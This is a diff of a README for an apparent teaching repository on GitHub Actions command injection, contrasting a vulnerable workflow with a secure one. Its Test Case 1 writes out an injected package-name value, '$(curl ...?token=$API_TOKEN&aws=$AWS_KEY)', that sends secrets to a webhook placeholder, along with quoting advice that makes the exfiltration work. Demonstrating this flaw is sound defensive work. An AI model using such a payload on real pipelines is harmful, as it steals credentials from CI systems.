@@ -82,8 +82,15 @@ After testing and reviewing GitHub's official documentation:
 
 This repository contains two workflows that demonstrate the security difference:
 
-### 1. `vulnerable.yml` - Direct Interpolation (VULNERABLE)
-Uses `${{ inputs.* }}` directly in shell commands. Command injection succeeds via command substitution.
+### 1. `vulnerable.yml` - Three Vulnerability Patterns (VULNERABLE)
+
+Demonstrates three distinct attack scenarios:
+
+**Pattern 1: Untrusted GitHub Context** - Shows that `github.actor` and other GitHub context variables are untrusted
+
+**Pattern 2: Command Injection (No Secrets)** - Proves direct interpolation allows arbitrary command execution
+
+**Pattern 3: Secret Exfiltration** - Demonstrates actual secret theft when secrets are in `env:` but input uses direct interpolation
 
 ### 2. `secure.yml` - Proper Security Fix (SECURE)
 Uses **both** environment variables **and** input validation. This demonstrates the complete defense-in-depth approach recommended by GitHub.
@@ -119,13 +126,13 @@ These are fake secrets for demonstration only. The workflows will use them to sh
 - A webhook URL from https://webhook.site for testing
 - Access to this repository's Actions tab
 
-### Test Case 1: Direct Interpolation (Vulnerable)
+### Test Case 1: Secret Exfiltration (Vulnerable)
 
 **Workflow:** `vulnerable.yml`
 
 **Package name:**
 ```
-$(curl https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET)
+$(curl "https://webhook.site/YOUR-WEBHOOK-ID?token=$API_TOKEN&aws=$AWS_KEY")
 ```
 
 **Package version:**
@@ -134,9 +141,11 @@ $(curl https://webhook.site/YOUR-WEBHOOK-ID?secret=$DEMO_SECRET)
 ```
 
 **Expected result:**
-- ✅ Command executes (you'll see curl progress in logs)
-- ✅ Webhook receives request with secret
-- ✅ Proves the vulnerability is exploitable
+- ✅ Command executes in Pattern 3 (you'll see curl progress in logs)
+- ✅ Webhook receives request with **both secrets**: `token` and `aws` parameters
+- ✅ Proves secrets in `env:` can be exfiltrated via direct interpolation
+
+**Important:** URL must be quoted (`"URL"`) to prevent `&` from being interpreted as a background operator. Without quotes, only the first parameter is sent and `aws=$AWS_KEY` runs as a background job.
 
 ### Test Case 2: Secure Workflow with Protection
 
